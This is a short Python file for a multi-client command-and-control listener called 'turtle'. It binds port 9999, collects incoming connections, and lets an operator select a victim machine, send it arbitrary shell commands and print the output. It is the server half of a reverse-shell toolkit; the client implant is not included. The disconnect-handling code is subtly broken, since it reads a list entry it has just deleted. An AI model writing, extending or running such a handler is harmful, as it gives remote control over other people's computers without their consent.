import socket
import sys
import threading
import time


connections = []
addresses = []
Shutdown_Flag=threading.Event()
global current_client
current_client = None
conn_lock = threading.Lock()



def sock():
    try:
        global s
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        print("Listening on port:9999")
        s.bind(("0.0.0.0",9999))
        s.listen(5)
        return s
        
    except KeyboardInterrupt:
        print("server shutting down!\n")
        s.close()
        sys.exit(1)



def Connection_Handling():

    while not Shutdown_Flag.is_set():
        try:
            conn,addr=s.accept()
            with conn_lock:
                addresses.append(addr)
                connections.append(conn)
            print(f"Established connection with {addr[0]}:{addr[1]}\n")
        except (OSError,socket.error):
            break



def turtle():
    global current_client
    while not Shutdown_Flag.is_set():

        try:
            if (current_client):
                prompt=f"{current_client} >"
            else:
                prompt="turtle >"    
            cmd=input(prompt)

            if (not cmd):
                continue

            elif (cmd=="list"):
                list_connections()

            elif (cmd=="exit"):
                Shutdown_Flag.set()

            elif "select" in cmd:
                try:
                    target=cmd.replace("select ","")
                    target=int(target)
                    conn=connections[target]
                    current_client=addresses[target]
                except:
                    print("Invalid Client Index\n")  
            
            elif (current_client):
                with conn_lock:
                    I=addresses.index(current_client)
                    conn=connections[I]
                    send_commands(conn,cmd)
                


            else:
                print("Client not found!\n")

            
        
        except (EOFError, KeyboardInterrupt):
            print("\nShutting down command interface...")
            Shutdown_Flag.set()
            break  


def list_connections():
    print("--- ACTIVE CLIENTS ---")
    for i, addr in enumerate(addresses):
        print(f"{i}     {addr[0]}    {addr[1]}")
   



def send_commands(conn, cmd):
    try:
        conn.send(cmd.encode())
        client_response=conn.recv(50000).decode()
        print(client_response, end='')
    except (ConnectionResetError, BrokenPipeError):
        print("Client disconnected!")
        with conn_lock:
            if conn in connections:
                index = connections.index(conn)
                del connections[index]
                del addresses[index]
                global current_client
                if current_client == addresses[index][0]:
                    current_client = None
    except KeyboardInterrupt:
        raise  


def cleanup(sock):
    with conn_lock: 
        for conn in connections:
            conn.close()
    sock.close()



def main():

    s=sock()

    conn_thread = threading.Thread(target=Connection_Handling)
    conn_thread.start()
    try:
        turtle()
    finally:
        Shutdown_Flag.set()
        cleanup(s)

main()
    

